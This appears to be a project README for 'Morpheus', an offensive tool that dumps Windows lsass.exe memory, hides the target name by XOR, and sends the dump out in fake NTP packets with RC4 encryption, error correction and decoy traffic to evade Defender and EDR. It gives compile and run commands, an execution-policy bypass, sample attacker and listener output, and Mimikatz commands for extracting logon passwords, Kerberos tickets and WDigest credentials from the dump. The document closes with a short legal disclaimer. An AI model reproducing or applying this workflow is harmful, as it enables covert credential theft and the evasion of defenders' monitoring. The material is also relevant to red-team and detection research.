
<h1 align="center"> Project Morpheus </h1>

## Overview

Morpheus is a covert tool designed to dump the memory of the Windows process "lsass.exe" and exfiltrate it using stealthy network techniques. Unlike traditional tools such as Mimikatz, Morpheus performs all operations entirely in RAM—minimizing disk artifacts—and leverages advanced network obfuscation methods to evade detection by Windows Defender, EDR, and forensic tools.

The project consists of:
- A dumper (`morpheus.c`) that extracts the target process's memory (`lsass.exe`) using Windows debugging APIs.
- A sender that compresses, fragments, and then exfiltrates the memory dump over UDP using packets disguised as legitimate NTP requests.
- A receiver (`server.py`) that reassembles the fragments, decompresses the dump, and writes it to a file for further analysis.

## Features

### Process Identification & Obfuscation

- **Obfuscated Target:**
  The target process name ("lsass.exe") is obfuscated in the source code using XOR encoding (with key 0x13) to avoid static signature detection.
- **Dynamic Enumeration:**
  The tool uses Windows APIs (e.g., `CreateToolhelp32Snapshot`) to enumerate running processes, dynamically locating the target's PID at runtime.

### Memory Dumping & Compression

- **In-Memory Dumping:**
  Morpheus leverages the `MiniDumpWriteDump` function from `DbgHelp.dll` to dump the target's memory directly into RAM, avoiding any disk writes.
- **In-Memory Compression:**
  The memory dump is compressed using zlib. This not only reduces the total amount of data that needs to be exfiltrated but also helps disguise the data by reducing its signature.

### Covert Exfiltration via Fake NTP Packets

- **NTP Packet Camouflage:**
  The compressed dump is fragmented into small chunks (each fragment carrying 2 bytes of useful data) and transmitted via UDP packets that mimic NTP requests.
- **Data Embedding:**
  Each 48-byte NTP packet is manipulated to embed covert data in the "Transmit Timestamp" field:
  - **Header Packet:**
    The very first packet is unencrypted and includes:
      - 4 bytes: Total number of fragments (big-endian)
      - 4 bytes: Total compressed dump size (big-endian)
  - **Data Packets:**
    Subsequent packets carry:
      - 4 bytes: Fragment sequence number (encrypted with RC4)
      - 4 bytes: Data fragment (encrypted with RC4)
- **RC4 Encryption:**
  Every payload (both data and parity) is encrypted with a simple RC4 stream cipher using a predefined key. Additionally, a variable "skip" value is computed based on the sequence number to add further randomness to the keystream, ensuring that even if packets are intercepted, the hidden data remains obfuscated.

### Enhanced Reliability with RFEC & Retransmission

- **RFEC Using Reed-Solomon Coding:**
  Morpheus implements advanced Reed Forward Error Correction (RFEC) techniques by using the Reed-Solomon algorithm. The algorithm operates over GF(256) (Galois Field 256) using precomputed logarithm and exponentiation tables, based on the primitive polynomial 0x11d.
  - A Vandermonde matrix is used to generate the parity symbols. For every block of data fragments (with a block size defined by a configurable parameter), an equal number of parity fragments is computed.
  - These parity fragments, often referred to as RFEC or Reed-Solomon coding packets, allow the receiver to recover any missing data fragments even in the presence of packet loss.
- **Feedback-Based Retransmission:**
  A feedback mechanism over UDP is implemented to detect missing fragments. The sender listens on port 123 for feedback packets that specify the sequence numbers of fragments that were not successfully received, and then retransmits those fragments. This process repeats up to a configurable maximum number of retransmission cycles.
- **Randomized Transmission & Decoy Packets:**
  To further obfuscate exfiltration, the order of fragment transmission is randomized. Additionally, decoy NTP packets are sent intermittently to blend with legitimate traffic and mislead network monitoring systems.

## How NTP Packet Camouflage Works

### Standard NTP Packet Structure

A standard NTP packet is 48 bytes long with the last 8 bytes dedicated to the Transmit Timestamp. Morpheus repurposes this field for covert data transmission:

```
      0                   1                   2                   3
      0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
     |LI | VN  |Mode |    Stratum     |     Poll      |  Precision   |
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
     |                          Root Delay                           |
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
     |                       Root Dispersion                         |
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
     |                     Reference Identifier                      |
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
     |                                                               |
     |                   Reference Timestamp (64 bits)               |
     |                                                               |
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
     |                                                               |
     |                   Originate Timestamp (64 bits)               |
     |                                                               |
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
     |                                                               |
     |                    Receive Timestamp (64 bits)                |
     |                                                               |
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
     |                                                               |
     |                    Transmit Timestamp (64 bits)               |
     |                                                               |
     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### Data Embedding Details

- **Header Packet:**
  - 4 bytes: Total number of fragments
  - 4 bytes: Total compressed dump size
- **Data Packets:**
  - 4 bytes: Fragment sequence number (encrypted with RC4)
  - 4 bytes: Data fragment (encrypted with RC4)
- **RFEC (Reed-Solomon) Packets:**
  For each block of data fragments, an equal number of parity fragments is generated using the Reed-Solomon algorithm. These packets are marked with a special high-order bit in the sequence number to denote RFEC data.

## Installation & Compilation

### Windows (PowerShell)

If you are using Visual Studio Code or another configured development environment:
1. Open a PowerShell window and run:
   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force; ./run.ps1
   ```
   This script compiles `memdump.c` while linking against the necessary libraries (`ws2_32.lib` and `DbgHelp.lib`).

## Usage

1. **Run the Dumper (Attacker)**

   On Windows, run:
   ```powershell
   .\memdump.exe
   ```
   You will be prompted to enter the receiver’s IP address and port for exfiltration.

   **Important:** The executable must be run with SYSTEM privileges to properly access `lsass.exe`'s memory.

2. **Run the Receiver (Listener)**

   On the attacker's machine, run:
   ```bash
   python3 server.py
   ```
   The Python receiver listens on UDP port 123 (NTP), reassembles the incoming fragments, decompresses the memory dump, and saves it as a file (typically named `dump_memory.bin`).

## Example Execution

### Attacker (Dumper)

```plaintext
[*] Enter receiver IP: 192.168.1.100
[*] Enter receiver port: 123
[+] Decoded target process: lsass.exe
[+] Process lsass.exe found with PID 1234
[+] Memory dump completed. Size: 16 MB.
[+] Compression completed. Compressed size: 512 KB.
[+] Header sent: 128 fragments, 512 KB total.
[+] Data packet for fragment 1/128 sent.
...
[+] Transmission completed.
```

### Receiver (Listener)

```plaintext
[INFO] Listening on 0.0.0.0:123 (global timeout: 30s)
[INFO] Header received: 128 fragments, 512 KB compressed size.
[INFO] Receiving packets...
[Reconstitution] [========------] 50% (64/128)
[INFO] All fragments received.
[INFO] Decompressing...
[INFO] Dump saved as dump_memory.bin.
```

## Analyzing the Dump with Mimikatz

Once `dump_memory.bin` is obtained, use Mimikatz to extract sensitive information:

- **Download Mimikatz:**
  Get the latest version from the official GitHub repository: [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)

- **Run Mimikatz:**
  Open a command prompt with administrative privileges and navigate to the Mimikatz directory.

- **Load and Analyze the Memory Dump:**
  ```shell
  mimikatz # sekurlsa::minidump dump_memory.bin
  mimikatz # sekurlsa::logonpasswords
  ```
  The first command loads the memory dump.

  The second command extracts and displays logon credentials.

- **Extract Additional Information:**
  ```shell
  mimikatz # sekurlsa::tickets
  mimikatz # sekurlsa::wdigest
  ```
  `sekurlsa::tickets` extracts Kerberos tickets.

  `sekurlsa::wdigest` retrieves plaintext credentials stored by WDigest.

## Legal Notice

This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY. Use it only on systems you own or for which you have explicit permission to test. Unauthorized use is illegal and unethical.
